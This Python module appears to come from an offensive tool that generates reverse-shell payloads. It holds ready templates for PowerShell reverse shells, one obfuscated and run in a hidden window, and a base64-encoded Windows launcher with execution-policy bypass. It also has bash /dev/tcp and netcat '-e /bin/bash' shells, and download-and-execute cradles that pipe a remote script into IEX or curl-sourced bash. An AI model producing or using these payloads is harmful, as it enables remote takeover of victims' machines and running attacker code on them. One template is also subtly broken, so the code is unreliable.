from abc import ABC, abstractmethod
from .decorators import b64psencode
from .exceptions import *

class Payload(ABC):
    """
    Astract class for a payload
    """

    @property
    def ip(self):
        return self._ip

    @ip.setter
    def ip(self, ip):
        self._ip = ip

    @property
    def port(self):
        return self._port

    @port.setter
    def port(self, port):
        if type(port) == int:
            port = str(port)

        if port.isdigit():
            self._port = port
        else:
            raise BadPortForPayloadError(f"The port must be a number, {port} is not")

    @property
    def template(self):
        return self._template

    @template.setter
    def template(self, index):
        if(type(index) == str):
            index = int(index) if index.isdigit() else 0

        if int(index) < len(self._reverse_shell_template):
            self._template = int(index)
        else:
            self._template = 0

    @abstractmethod
    def get_reverse_shell(self):
        """
        Return the reverse shell payload associated to the class
        """
        pass

class DefaultPayload(Payload):
    """Default Payload class"""
    def __init__(self):
        self.template = 0
        self._ip = None
        self._port = None

    def with_ip(self, ip):
        self.ip = ip
        return self

    def with_port(self, port):
        self.port = port
        return self

    def using_template(self, num):
        self.template = num
        return self

    def get_template(self):
        return self._reverse_shell_template[self.template]

    def get_reverse_shell(self):
        if(self.ip != None and self.port != None):
            return self.get_template().replace("<IP>", self.ip).replace("<PORT>", self.port)
        raise IpOrPortNotSetError("Ip or Port has not been set")

class RemotePayload(DefaultPayload):
    """Remote Payload class, that also takes a route as argument"""
    def __init__(self):
        super().__init__()
        self._route = None

    @property
    def route(self):
        return self._route

    def for_route(self, route):
        self._route = route
        return self

    def get_reverse_shell(self):
        if(self.ip != None and self.port != None):
            return self.get_template().replace("<IP>", self.ip).replace("<PORT>", self.port).replace("<ROUTE>", self.route)
        raise IpOrPortNotSetError("Ip or Port has not been set")

    @classmethod
    def get_remote_payload(cls, ip, port, route):
        """Get the remote payload by giving ip port and route to the class method"""
        return cls._reverse_shell_template[0].replace("<IP>", ip).replace("<PORT>", port).replace("<ROUTE>", route)

class PowershellPayload(DefaultPayload):
    """
    Class Generating a payload for powershell target
    """
    _reverse_shell_template = [
                                """Start-Process $PSHOME\\powershell.exe -ArgumentList {$myTcpClient = New-Object System.Net.Sockets.TCPClient('<IP>', <PORT>);Start-Sleep -Seconds 0.3;$stream = $myTcpClient.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex (". { $data } 2>&1") | Out-String );Measure-Object | Out-Null;<# Carefull chilling #>; $DehedkZ = $sendback + (&(gcm p????t) |Out-String).TrimEnd() + ' ';<# I never been so looooooved !! Ouh yeah yeah  #> $sendbyte = ([text.encoding]::ASCII).GetBytes($DehedkZ);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$myTcpClient.Close()} -WindowStyle Hidden""",
                                """New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"""
                                ]
    def __init__(self):
        self.default_output = "infile"

class WindowsPayload(PowershellPayload):
    """
    Class Generating a payload for windows target
    Actually, a reverse shell for windows is juste a reverse shell encoded for powershell
    """
    def get_reverse_shell(self):
        ps_payload = super().get_reverse_shell()
        return "powershell -ep bypass -nop -e " + b64psencode(ps_payload)

class LinuxPayload(DefaultPayload):
    """
    Class Generating a payload for windows target
    """
    _reverse_shell_template = [
                                'bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"',
                                'nc -e /bin/bash <IP> <PORT>',
                                'bash -c "setsid bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 2>&1 &"',
                                'setsid nc -e /bin/bash <IP> <PORT> &'
                                ]
    def __init__(self):
        self.default_output = "show"

class RemoteLinuxPayload(RemotePayload):
    _reverse_shell_template = [ # This payload loads the script and interpret it in memory of the current shell
                                'source <(curl -s http://<IP>:<PORT>/<ROUTE>)'
                                ]

class RemoteWindowsPayload(RemotePayload):
    _reverse_shell_template = [
                                'powershell -ep bypass -nop -c "(new-object System.Net.Webclient).downloadstring(\'http://<IP>:<PORT>/<ROUTE>\')|IEX"'
                                ]

class RemotePowershellPayload(RemotePayload):
    _reverse_shell_template = [
                                '(new-object System.Net.Webclient).downloadstring("http://<IP>:<PORT>/<ROUTE>")|IEX'
                                ]

class PayloadBuilder:
    """
    PayloadBuilder is the class responsible for building a payload class
    """

    PayloadClass = {
               "powershell"       : PowershellPayload,
               "windows"          : WindowsPayload,
               "linux"            : LinuxPayload,
               "remotelinux"      : RemoteLinuxPayload,
               "remotewindows"    : RemoteWindowsPayload,
               "remotepowershell" : RemotePowershellPayload
                }

    @classmethod
    def build_for(cls, target):
        target_class = cls.PayloadClass.get(target.lower())
        if target_class:
            return target_class()
        return None
